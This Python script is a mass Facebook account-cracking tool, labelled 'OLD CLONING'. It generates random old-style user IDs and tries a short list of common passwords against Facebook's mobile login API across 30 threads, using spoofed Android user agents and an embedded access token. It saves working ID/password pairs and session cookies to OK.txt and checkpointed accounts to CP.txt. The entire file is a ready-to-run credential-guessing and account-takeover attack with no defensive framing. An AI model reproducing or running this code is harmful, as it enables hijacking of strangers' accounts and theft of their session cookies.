#-----------------------[ IMPORTS ]-----------------------#
import os
import sys
import time
import random
import requests
import locale
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

#-----------------------[ CONFIGURATION ]-----------------------#
BASE_DIR = '/sdcard/old'
os.makedirs(BASE_DIR, exist_ok=True)

#-----------------------[ COLORS ]-----------------------#
class Colors:
    WHITE = '\x1b[1;97m'
    RED = '\x1b[38;5;196m'
    YELLOW = '\033[1;33m'
    GREEN = '\x1b[38;5;46m'
    BLUE = '\33[1;34m'
    CYAN = '\x1b[1;96m'
    RESET = '\x1b[0m'

#-----------------------[ UTILITY FUNCTIONS ]-----------------------#
def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def get_current_time():
    """Get current timestamp for logging"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def random_choice(choices):
    """Random choice from list"""
    return random.choice(choices)

def random_range(start, end):
    """Random number in range"""
    return random.randint(start, end)

#-----------------------[ DATE & TIME ]-----------------------#
def get_greeting(lang=None):
    if lang is None:
        sys_locale = locale.getdefaultlocale()[0] or "en_US"
        lang = "id" if "id" in sys_locale.lower() else "en"

    now = datetime.now()
    hour, day, month, year = now.hour, now.day, now.month, now.year

    months_id = {
        1: "Januari", 2: "Februari", 3: "Maret", 4: "April", 
        5: "Mei", 6: "Juni", 7: "Juli", 8: "Agustus", 
        9: "September", 10: "Oktober", 11: "November", 12: "Desember"
    }
    
    months_en = {
        1: "January", 2: "February", 3: "March", 4: "April", 
        5: "May", 6: "June", 7: "July", 8: "August", 
        9: "September", 10: "October", 11: "November", 12: "December"
    }

    if lang == "id":
        if 4 <= hour < 12:
            greeting = "Selamat Pagi"
        elif 12 <= hour < 15:
            greeting = "Selamat Siang"
        elif 15 <= hour < 18:
            greeting = "Selamat Sore"
        else:
            greeting = "Selamat Malam"
        
        month_name = months_id[month]
        return f"{greeting}, hari ini {day} {month_name} {year}"
    else:
        if 4 <= hour < 12:
            greeting = "Good Morning"
        elif 12 <= hour < 15:
            greeting = "Good Afternoon"
        elif 15 <= hour < 18:
            greeting = "Good Evening"
        else:
            greeting = "Good Night"
        
        month_name = months_en[month]
        return f"{greeting}, today is {month_name} {day}, {year}"

#-----------------------[ USER AGENT GENERATOR ]-----------------------#
def generate_user_agent():
    density = random_choice(['1.0', '1.5', '2.0'])
    width = random_choice(["720", "1080", "1280"])
    height = random_choice(["720", "1080", "1280", "1920"])
    build = random_choice([
        'SKQ1.210216.001', 'RKQ1.211103.002', 
        'SP1A.210812.016', 'TP1A.220905.001'
    ])
    device = random_choice(["CHP7800", "CPH3818"])
    android_version = random_range(6, 13)
    
    return (
        f"Dalvik/2.1.0 (Linux; Android {android_version}.0.1; {device} Build/{build}) "
        f"FB_IAB/FB4A;FBAV/{random_range(200,300)}.0.0.{random_range(10,150)}.{random_range(50,180)}; "
        f"FBDM/density={density}, width={width}, height={height}; "
        "Mozilla/5.0 (Linux; Android 6.0.1; wv) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36"
    )

#-----------------------[ ACCOUNT GENERATOR ]-----------------------#
def generate_accounts(limit, method=1):
    accounts = []
    
    if method == 1:
        prefixes = ["100000", "100001", "100002", "100003"]
        for _ in range(limit):
            prefix = random_choice(prefixes)
            number = str(random_range(4400000000, 4499999999))
            accounts.append(prefix + number)
    else:
        prefix = "100000"
        for _ in range(limit):
            number = str(random_range(440000000, 449999999))
            accounts.append(prefix + number)
    
    return accounts

#-----------------------[ FACEBOOK LOGIN ]-----------------------#
class FacebookLogin:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.common_passwords = ["123456", "1234567", "12345678", "123456789"]
    
    def create_headers(self):
        return {
            "x-fb-connection-bandwidth": str(random_range(20000000, 40000000)),
            "x-fb-sim-hni": str(random_range(20000, 40000)),
            "x-fb-net-hni": str(random_range(20000, 40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": random_choice([
                "cell.CTRadioAccessTechnologyHSDPA",
                "cell.CTRadioAccessTechnologyLTE",
                "wifi"
            ]),
            "user-agent": generate_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger",
            "accept-encoding": "gzip, deflate"
        }
    
    def login(self, user_id):
        try:
            for password in self.common_passwords:
                result = self._attempt_login(user_id, password)
                if result:
                    return result
            
            return {"status": "failed", "user_id": user_id}
            
        except Exception as e:
            return {"status": "error", "user_id": user_id, "error": str(e)}
    
    def _attempt_login(self, user_id, password):
        headers = self.create_headers()
        
        url = (
            f"https://b-api.facebook.com/method/auth.login"
            f"?format=json&email={user_id}&password={password}"
            "&credentials_type=device_based_login_password"
            "&generate_session_cookies=1"
            "&error_detail_type=button_with_disabled"
            "&source=device_based_login"
            "&method=GET&locale=en_US"
            "&client_country_code=US"
            "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
        )
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            data = response.json()
            
            # Successful login
            if "session_key" in data:
                cookies = ";".join(
                    f"{cookie['name']}={cookie['value']}" 
                    for cookie in data.get("session_cookies", [])
                )
                return {
                    "status": "ok", 
                    "user_id": user_id, 
                    "password": password, 
                    "cookies": cookies,
                    "user_agent": headers["user-agent"]
                }
            
            # Checkpoint required
            elif "www.facebook.com" in data.get("error_msg", ""):
                return {
                    "status": "cp", 
                    "user_id": user_id, 
                    "password": password,
                    "user_agent": headers["user-agent"]
                }
                
        except requests.RequestException:
            pass
        
        return None

#-----------------------[ RESULT HANDLER ]-----------------------#
class ResultHandler:
    def __init__(self):
        self.ok_count = 0
        self.cp_count = 0
        self.total_attempts = 0
    
    def display_progress(self):
        """Display current progress"""
        sys.stdout.write(
            f'\r{Colors.WHITE}»» {get_current_time()} '
            f'»» {self.total_attempts} '
            f'»» OK:{self.ok_count} '
            f'»» CP:{self.cp_count}'
        )
        sys.stdout.flush()
    
    def handle_result(self, result):
        """Handle login result"""
        self.total_attempts += 1
        
        if result["status"] == "ok":
            self.ok_count += 1
            self._save_ok(result)
            self._print_ok(result)
            
        elif result["status"] == "cp":
            self.cp_count += 1
            self._save_cp(result)
            self._print_cp(result)
        
        self.display_progress()
    
    def _save_ok(self, result):
        """Save successful login"""
        with open(f"{BASE_DIR}/OK.txt", "a") as f:
            f.write(f"{result['user_id']}|{result['password']}|{result['cookies']}\n")
    
    def _save_cp(self, result):
        """Save checkpoint account"""
        with open(f"{BASE_DIR}/CP.txt", "a") as f:
            f.write(f"{result['user_id']}|{result['password']}\n")
    
    def _print_ok(self, result):
        """Print successful login"""
        print(f'\n{Colors.RED}[OK] ID: {result["user_id"]} '
              f'PASSWORD: {result["password"]}\n'
              f'COOKIE: {result["cookies"]}\n'
              f'UA: {result["user_agent"]}{Colors.RESET}')
    
    def _print_cp(self, result):
        """Print checkpoint account"""
        print(f'\n{Colors.YELLOW}[CP] ID: {result["user_id"]} '
              f'PASSWORD: {result["password"]}\n'
              f'UA: {result["user_agent"]}{Colors.RESET}')

#-----------------------[ MAIN MENU ]-----------------------#
def show_main_menu():
    """Display main menu"""
    clear_screen()
    print("="*50 + f"{Colors.RESET}")
    
    print(f'{Colors.RED}({Colors.RED}1{Colors.RED}){Colors.RED} OLD CLONING')
    print(f'{Colors.RED}({Colors.RED}0{Colors.RED}){Colors.RED} EXIT')
    
    choice = input(f'\n{Colors.RED}({Colors.RED}☂{Colors.RED}){Colors.RED} INPUT : ')
    return choice

def show_old_clone_menu():
    """Display old clone menu"""
    clear_screen()
    print(f'{Colors.RED}({Colors.RED}☂{Colors.RED}) {Colors.RED}EXAMPLE : '
          f'{Colors.RED}3000{Colors.RED}/{Colors.RED}5000{Colors.RED}/'
          f'{Colors.RED}10000{Colors.RED}/{Colors.RED}99999')
    
    try:
        limit = int(input(f"{Colors.RED}({Colors.RED}☂{Colors.RED}) {Colors.RED}INPUT : "))
    except ValueError:
        print(f"{Colors.RED}Invalid input! Please enter a number.")
        time.sleep(2)
        return
    
    clear_screen()
    print(f'{Colors.RED}({Colors.RED}1{Colors.RED}) {Colors.RED}METHOD {Colors.RED}({Colors.RED}BEST-1{Colors.RED})')
    
    try:
        method = int(input(f"{Colors.RED}({Colors.RED}☂{Colors.RED}) {Colors.RED}INPUT : "))
    except ValueError:
        method = 1
    
    return limit, method

def execute_old_clone(limit, method):
    """Execute old clone process"""
    # Generate accounts
    accounts = generate_accounts(limit, method)
    
    # Initialize components
    facebook_login = FacebookLogin()
    result_handler = ResultHandler()
    
    clear_screen()
    print(f'{Colors.BLUE}»{Colors.YELLOW}»{Colors.RED} TOTAL CRACK: {Colors.WHITE}{limit}{Colors.RESET}')
    print("Starting...\n")
    
    # Process accounts with thread pool
    with ThreadPoolExecutor(max_workers=30) as executor:
        # Submit all tasks
        future_to_account = {
            executor.submit(facebook_login.login, account): account 
            for account in accounts
        }
        
        # Process completed tasks
        for future in as_completed(future_to_account):
            result = future.result()
            result_handler.handle_result(result)

#-----------------------[ APPLICATION FLOW ]-----------------------#
def main():
    """Main application flow"""
    while True:
        try:
            choice = show_main_menu()
            
            if choice == "1":
                result = show_old_clone_menu()
                if result:
                    limit, method = result
                    execute_old_clone(limit, method)
                    
                    # Ask to continue
                    input(f"\n{Colors.RED}Press Enter to continue...{Colors.RESET}")
                    
            elif choice == "0":
                print(f"{Colors.RED}Goodbye!{Colors.RESET}")
                sys.exit(0)
            else:
                print(f"{Colors.RED}Invalid choice!{Colors.RESET}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Program interrupted by user.{Colors.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}Unexpected error: {e}{Colors.RESET}")
            time.sleep(2)

#-----------------------[ START ]-----------------------#
if __name__ == "__main__":
    main()